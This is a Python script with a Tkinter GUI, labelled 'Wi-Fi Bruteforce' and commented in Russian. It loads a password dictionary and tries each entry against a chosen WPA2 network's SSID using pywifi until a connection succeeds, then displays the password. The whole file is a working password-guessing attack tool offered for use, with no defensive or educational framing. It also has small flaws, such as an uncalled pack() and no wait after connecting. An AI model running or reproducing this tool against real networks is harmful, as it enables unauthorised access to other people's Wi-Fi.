import tkinter as tk
import os
import pywifi
from tkinter import ttk, scrolledtext

# Получаем текущий рабочий каталог
current_directory = os.path.dirname(os.path.abspath(__file__))
dictionaries_directory = os.path.join(current_directory, "dictionaries")

wifi = pywifi.PyWiFi()
iface = wifi.interfaces()[0]

def start_bruteforce():
    try:
        ssid = ssid_entry.get()
        file_path = os.path.join(dictionaries_directory, "passwords.txt")
        
        if os.path.exists(file_path):
            with open(file_path, 'r') as file:
                passwords = file.readlines()

            total_passwords = len(passwords)
            progress = 0

            for password in passwords:
                password = password.strip()
                profile = pywifi.Profile()
                profile.ssid = ssid
                profile.auth = pywifi.const.AUTH_ALG_OPEN
                profile.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)
                profile.cipher = pywifi.const.CIPHER_TYPE_CCMP
                profile.key = password

                iface.remove_all_network_profiles()
                tmp_profile = iface.add_network_profile(profile)
                iface.connect(tmp_profile)

                progress += 1
                progress_bar['value'] = (progress / total_passwords) * 100
                progress_bar.update()

                if iface.status() == pywifi.const.IFACE_CONNECTED:
                     result_text.configure(state='normal')
                     result_text.insert(tk.END, "Password found: " + password + "\n")
                     result_text.configure(state='disabled')
                     root.quit()  # Остановить выполнение программы
                     break
                
                
       
        else:
            result_text.configure(state='normal')
            result_text.insert(tk.END, "File 'passwords.txt' not found in 'dictionaries' directory.")
            result_text.configure(state='disabled')
    except Exception as e:
        result_text.configure(state='normal')
        result_text.insert(tk.END, "An error occurred: " + str(e))
        result_text.configure(state='disabled')

# Создаем графический интерфейс
root = tk.Tk()
root.title("Wi-Fi Bruteforce")
root.configure(bg='black')  

banner_text = "█░█░█ █ █▀▀ █   █▄▄ █▀█ █░█ ▀█▀ █▀▀\n▀▄▀▄▀ █ █▀░ █   █▄█ █▀▄ █▄█ ░█░ ██▄"
banner_label = tk.Label(root, text=banner_text, bg='black', fg='cyan')
banner_label.pack()

ssid_label = tk.Label(root, text="Enter Wi-Fi SSID:", bg='black', fg='red')
ssid_label.pack()
ssid_entry = tk.Entry(root)
ssid_entry.pack()

start_button = tk.Button(root, text="Start Bruteforce", command=start_bruteforce, bg='black', fg='red')
start_button.pack()

progress_bar = ttk.Progressbar(root, orient=tk.HORIZONTAL, length=200, mode='determinate')
progress_bar.pack()

result_text = scrolledtext.ScrolledText(root, wrap=tk.WORD, width=50, height=10)
result_text.pack

root.mainloop()